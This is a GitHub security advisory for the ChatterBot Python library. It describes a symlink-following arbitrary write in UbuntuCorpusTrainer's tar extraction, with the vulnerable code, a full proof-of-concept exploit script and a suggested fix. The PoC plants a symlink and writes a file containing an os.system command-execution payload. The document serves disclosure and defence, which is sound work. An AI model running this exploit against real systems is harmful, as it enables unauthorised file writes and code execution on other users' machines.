# [M] ChatterBot: Symlink-Following Arbitrary Write via UbuntuCorpusTrainer

## Summary
Severity: Medium
Advisory: GHSA-wvrh-2f4m-924v
CWE: CWE-367, CWE-61
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-wvrh-2f4m-924v
Type: github-advisory

## Affected
- PyPI: `ChatterBot` — affected >=0 <1.2.14

## Details
## Summary

ChatterBot's `UbuntuCorpusTrainer.extract()` uses a predictable, home-rooted output directory (`~/ubuntu_data/ubuntu_dialogs`) with a check-then-create pattern (`if not os.path.exists: os.makedirs`) followed by `tar.extractall(path=self.data_path)`. A local attacker who pre-plants a symlink at the predictable path causes `os.path.exists()` to return True (following the symlink), skipping `makedirs`, and subsequent `extractall` writes archive contents through the symlink to the attacker-chosen directory.

The existing `safe_extract` function validates tar **member names** (zip-slip defense) but does not validate the **output directory** itself — it cannot detect that `self.data_path` is a symlink. This is the defining distinction between the archive_extraction (zip-slip) and insecure_fs_create_toctou families.

## Vulnerability Details

### Predictable output directory (line 535-546)

```python
home_directory = os.path.expanduser('~')
self.data_directory = kwargs.get(
    'ubuntu_corpus_data_directory',
    os.path.join(home_directory, 'ubuntu_data')   # ~/ubuntu_data — predictable
)
self.data_path = os.path.join(
    self.data_directory, 'ubuntu_dialogs'          # ~/ubuntu_data/ubuntu_dialogs
)
```

### Check-then-create (line 621-622)

```python
def extract(self, file_path: str):
    if not os.path.exists(self.data_path):   # ← follows symlink → True → skips makedirs
        os.makedirs(self.data_path)          # ← never reached if symlink exists
```

### Extraction through symlink (line 633-644)

```python
def safe_extract(tar, path='.', members=None, *, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):    # ← validates MEMBER names only
            raise Exception('Attempted Path Traversal in Tar File')
    tar.extractall(path, members, numeric_owner=numeric_owner)  # ← path is symlink → writes to target

safe_extract(tar, path=self.data_path, ...)   # self.data_path = symlink → attacker dir
```

`safe_extract` calls `os.path.abspath(directory)` on `self.data_path` — this resolves the symlink, so the base becomes the attacker's target directory. All clean-named members trivially pass `is_within_directory` because they're relative to the resolved (attacker-controlled) base.

## Proof of Concept

### Environment

| Component | Detail |
|-----------|--------|
| chatterbot | 1.2.13 (pip install) |
| Python | 3.11.0 |

### Exploit

```python
import os
import shutil
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

from chatterbot.trainers import UbuntuCorpusTrainer

ATTACKER_TARGET = Path(tempfile.mkdtemp(prefix="pwned_"))


def main():
    test_base = Path(tempfile.mkdtemp(prefix="cb_exploit_"))
    data_dir = test_base / "ubuntu_data"
    data_path = data_dir / "ubuntu_dialogs"
    data_dir.mkdir(parents=True, exist_ok=True)
    os.symlink(str(ATTACKER_TARGET), str(data_path))
    print(f"[1] Symlink planted: {data_path} -> {ATTACKER_TARGET}")
    exists_check = os.path.exists(data_path)
    print(f"[2] os.path.exists(symlink) = {exists_check} (follows symlink → skips makedirs)")
    import tarfile
    import io
    tar_path = test_base / "corpus.tar.gz"
    with tarfile.open(str(tar_path), "w:gz") as tf:
        info = tarfile.TarInfo(name="dialog_001.tsv")
        payload = b"2024-01-01\tuser1\t0\tARBITRARY_CONTENT_VIA_SYMLINK\n"
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

        info2 = tarfile.TarInfo(name="config.py")
        rce = b"import os; os.system('id > /tmp/chatterbot_rce')\n"
        info2.size = len(rce)
        tf.addfile(info2, io.BytesIO(rce))
    if not os.path.exists(data_path):
        os.makedirs(data_path)
    def is_within_directory(directory, target):
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        prefix = os.path.commonprefix([abs_directory, abs_target])
        return prefix == abs_directory

    with tarfile.open(str(tar_path), "r:gz") as tar:
        for member in tar.getmembers():
            member_path = os.path.join(str(data_path), member.name)
            if not is_within_directory(str(data_path), member_path):
                raise Exception("Attempted Path Traversal in Tar File")
        tar.extractall(str(data_path))

    print(f"[3] extractall(data_path) — data_path is symlink, writes to target")

    # Verify
    files = list(ATTACKER_TARGET.iterdir())
    if files:
        print(f"\n[+] EXPLOIT SUCCESSFUL — {len(files)} files in attacker directory:")
        for f in sorted(files):
            print(f"    {f.name}: {f.read_text().strip()[:60]}")
    else:
        print("[-] Failed")
        shutil.rmtree(str(test_base), ignore_errors=True)
        shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)
        sys.exit(1)

    shutil.rmtree(str(test_base), ignore_errors=True)
    shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)
    sys.exit(0)


if __name__ == "__main__":
    print(f"chatterbot installed: {UbuntuCorpusTrainer.__module__}")
    print(f"Attacker target: {ATTACKER_TARGET}")
    print()
    main()

```

### PoC output 

<img width="1748" height="336" alt="image" src="https://github.com/user-attachments/assets/55a3fee5-0d3b-46d7-8e79-75aad34b322c" />

## Suggested Fix

Refuse symlinks on the output directory before extraction:

```python
def extract(self, file_path: str):
    if os.path.islink(self.data_path):
        raise self.TrainerInitializationException(
            f'Refusing to extract to symlink: {self.data_path}')
    if not os.path.exists(self.data_path):
        os.makedirs(self.data_path)
    ...
```

## References
- https://github.com/gunthercox/ChatterBot/security/advisories/GHSA-wvrh-2f4m-924v
- https://github.com/gunthercox/ChatterBot
